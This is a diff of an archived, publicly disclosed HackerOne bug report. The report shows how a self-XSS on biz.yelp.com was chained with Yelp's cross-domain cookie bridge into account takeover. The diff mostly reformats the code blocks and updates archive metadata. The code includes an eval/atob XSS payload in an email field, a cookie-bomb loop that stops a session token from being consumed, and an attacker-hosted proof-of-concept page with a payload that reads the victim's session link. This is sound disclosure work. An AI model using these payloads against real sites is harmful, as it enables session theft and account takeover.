@@ -21,7 +21,7 @@ canonical_url: ""
 cited_by:
   - "2023.md:61"
 commit: ""
-content_sha256: be4f5bd1854a7a4adb65c463780cd759e8d80e50292fb52618e6e393ad567216
+content_sha256: 37b782d7b79766251d85dad7ba9c83a28955011fca050fe8c34c7ad0b646ab68
 depth: full
 depth_reason: default
 kind: article
@@ -31,10 +31,10 @@ original_url: "https://hackerone.com/reports/2089042"
 published: ""
 publisher: HackerOne
 publisher_english: ""
-raw_sha256: 66235b0c3b9caf341d4f3ddfbb81d31dbaf30150180bc93f58bde17ef83bde51
+raw_sha256: fcdefe0f55751f2627ad2ff94ebbcf2200fd8fdfa3c0d38eb1a7762413f7ec54
 retrieved_from: "https://hackerone.com/reports/2089042"
 retrieved_kind: browser
-retrieved_utc: "2026-08-09T02:39:29+00:00"
+retrieved_utc: "2026-09-14T09:15:17+00:00"
 slug: hackerone-yelp-disclosed-hackerone-yelp-com-biz-yelp-com-ato-xss
 snapshot: ""
 title_english: ""
@@ -48,12 +48,12 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <https://hackerone.com/reports/2089042>
-- Preserved from: https://hackerone.com/reports/2089042 (browser) on 2026-08-09
+- Preserved from: https://hackerone.com/reports/2089042 (browser) on 2026-09-14
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
-archive of a source from the Web Hacking Techniques Index collections, kept so the
-page going offline. To read the original, follow the link above.
+archive of a source from the Web Hacking Techniques Index collections, kept so
+it remains readable if the page goes offline. To read the original, follow the link above.
 
 ## Content
 
@@ -91,7 +91,9 @@ When a business user has not verified their email, a message is shown telling th
 
 **Code**•64 Bytes
 
-1"<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh
+```
+"<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh
+```
 
 and putting the payload base64 encoded in the url fragment
 
@@ -105,9 +107,13 @@ and putting the payload base64 encoded in the url fragment
 
 At this point this is just a Self-XSS, but I'll show how this can be used to target other uses.
 
+## yelp.com's Cookie Bridge
+
 Yelp has local versions of the website, so a user requesting the site in danish, will be redirected to `yelp.dk` and a user requesting the site in german will be redirected to `yelp.de`. If a users is signed into `yelp.com` and wishes to change language to danish, they can't just be sent to `yelp.dk` without having to log in again since `yelp.com` and `yelp.dk` are 2 completely different domains in the eyes of the browser, and so the users session cookies can't be used for both domains.
 
 To solve this challenge, Yelp has implemented a Cookie Bridge that works by sending a GET request to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK`. The backend will take all the users cookies and save them, redirect them to `https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=qCN_L-QbDTAVmqgKIAs2Dw&redir=%2F` which will then set the same cookies for the `yelp.dk` domain. The value of the `cookie_fsid` is unique for our cookies, and can only be used to retrieve the cookies once.
+
+## Using the Cookie Bridge to sign other users into our account
 
 We can use the Cookie bridge to sign a victim into our account. While signed into our account on `biz.yelp.com` we send a request to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK`. This will result in a `303` redirect to `https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=qCN_L-QbDTAVmqgKIAs2Dw&redir=%2F`. Instead of following the redirect we can have a victim visit the link, and they'll then be signed into our business user on `biz.yelp.dk`. We can even use the `redir` parameter to redirect the victim to `/home#[OUR BASE64 ENCODED XSS PAYLOAD]` and have the XSS trigger
 
@@ -120,7 +126,9 @@ The situation is as follows: The victim is logged in on `biz.yelp.com`. We sign 
 
 **Code**•121 Bytes
 
-1https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=qCN_L-QbDTAVmqgKIAs2Dw&redir=/home/%23[XSS PAYLOAD BASE64 ENCODED]
+```
+https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=qCN_L-QbDTAVmqgKIAs2Dw&redir=/home/%23[XSS PAYLOAD BASE64 ENCODED]
+```
 
 - Now we have javascript execution in Tab B. We now get a reference to Tab A and redirects it via `window.opener.location.href = "https://biz.yelp.com/cookie_bridge/store?dhl=da_DK"`. This will sign the victim into their own account on `biz.yelp.dk`. But our XSS is still alive in Tab B so we can now make requests from `biz.yelp.dk` with the victims session cookies.
 
@@ -130,7 +138,9 @@ At this point we're turned what started as a Self-XSS into regular XSS in the vi
 
 **Code**•121 Bytes
 
-1for (var i = 0; i < 15; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}
+```
+for (var i = 0; i < 15; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}
+```
 
 this will make all requests to `https://biz.yelp.dk/cookie_bridge/retrieve` fail, as openresty will complain that the cookie is too large. This will prevent the `cookie_fsid` token from being consumed:
 
@@ -155,13 +165,44 @@ Getting this URL can obviously be automated, but for this POC we're just getting
 
 **Code**•628 Bytes
 
-1<!DOCTYPE html> 2<html lang="en"> 3<head> 4 <meta charset="UTF-8"> 5 <title>yelp xss poc</title> 6 <script> 7 function openTarget() { 8 t = document.location.hash.substring(1); 9 window.target = window.open(t); 10 } 11 12 // register a postmessage listener 13 window.addEventListener('message', function (e) { 14 console.log(e); 15 if (e.data && e.data.redirect) { 16 location.href = e.data.redirect; // this is vulnerable to xss but idc 17 } 18 }); 19 20 </script> 21</head> 22<body> 23 <h1>Yelp.com account takeover POC</h1> 24 <button onclick="openTarget()">click here to start attack</button> 25</body> 26</html> 27
+```
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <title>yelp xss poc</title>
+ <script>
+ function openTarget() {
+      t = document.location.hash.substring(1);
+      window.target = window.open(t);
+ }
+
+ // register a postmessage listener
+    window.addEventListener('message', function (e) {
+      console.log(e);
+ if (e.data && e.data.redirect) {
+        location.href = e.data.redirect; // this is vulnerable to xss but idc
+ }
+ });
+
+ </script>
+</head>
+<body>
+ <h1>Yelp.com account takeover POC</h1>
+ <button onclick="openTarget()">click here to start attack</button>
+</body>
+</html>
+```
 
 and is hosted here: `https://calc.sh/yelp-poc-bah7ooli.html`. When the victim clicks our link in their browser they'll be signed in to our attacker account and the XSS payload will run. The payload is base64 encoded and the decoded payload looks like this:
 
 **Code**•337 Bytes
 
-1for (var i = 0; i < 16; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`} 2window.opener.postMessage({redirect:"https://biz.yelp.com/cookie_bridge/store?dhl=da_DK"}, "*"); 3setTimeout(function() {alert("attacker can now sign in as victim by going to:" + window.opener.location.href)}, 5000);
+```
+for (var i = 0; i < 16; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}
+window.opener.postMessage({redirect:"https://biz.yelp.com/cookie_bridge/store?dhl=da_DK"}, "*");
+setTimeout(function() {alert("attacker can now sign in as victim by going to:" + window.opener.location.href)}, 5000);
+```
 
 This code will set 16 large cookies each containing 1000 'X' chars. This will be enough to trigger the 400 error. After setting the cookies we find the opener tab, and send a postMessage asking it to redirect to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK` (*I'm using postMessage to do the redirect so that the attack also works in Firefox. In Chrome we could simply set `window.opener.location.href`, but that doesn't work in Firefox for some reason*). The browser will be redirected to `https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=[FSID VALUE]` but will trigger the 400 error such that the `cookie_fsid` won't be consumed. The last line in our payload can now read the href of the opener window as they share the same origin, and we show the url in an alert box to demonstrate the attacker now has the url and can sign in as the victim.
 
@@ -386,3 +427,7 @@ September 8, 2023, 7:22am UTC
 This report has been disclosed.
 
 September 8, 2023, 7:22am UTC
+
+## Recovery notes
+
+Source evidence recovered on 2026-09-14. The earlier source capture (SHA-256 `66235b0c3b9caf341d4f3ddfbb81d31dbaf30150180bc93f58bde17ef83bde51`) is no longer available. This publication uses a separately preserved capture of the same document recorded on 2026-09-14 (SHA-256 `fcdefe0f55751f2627ad2ff94ebbcf2200fd8fdfa3c0d38eb1a7762413f7ec54`). The complete exposed report and discussion were checked against this capture. Code examples now retain their source line breaks and characters in fenced blocks, and missing section headings were restored where present. The existing technique summary remains applicable. The missing earlier capture remains documented in the archive history.
